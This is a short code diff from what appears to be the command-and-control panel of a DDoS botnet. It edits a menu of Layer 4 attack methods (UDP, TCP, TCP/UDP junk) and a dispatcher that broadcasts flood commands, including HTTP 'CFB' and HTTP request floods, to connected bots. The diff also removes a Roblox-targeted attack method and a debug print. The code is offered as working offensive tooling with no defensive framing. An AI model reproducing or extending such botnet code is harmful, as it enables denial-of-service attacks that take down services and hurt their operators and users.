@@ -260,7 +260,7 @@ layer4 = f"""
     ╔═══════════════════════════╗
     ║   Methods L4
     ║═══════════════════════════╗
-    ║  .udp .tcp .tup | .roblox
+    ║  .udp .tcp .tup
     ╚═══════════════════════════╝
 """
 
@@ -625,11 +625,7 @@ def command_line(client):
             elif command == '.TUP':  # TCP/UDP Junk (Random TCP/UDP Data)
                 tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,
                     attack_sent2, broadcast, data)
-            elif command == '.ROBLOX':  # ROBLOX
-                roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,
-                    attack_sent2, broadcast, data)
             elif command == '.HTTP_CFB':  # HTTP CFB
-                print(args)
                 http_cfb(args,validate_time, send, client, ansi_clear,attack_sent1, broadcast, data)
             elif command == '.HTTP_REQ':  # HTTP REQ
                 print(args)
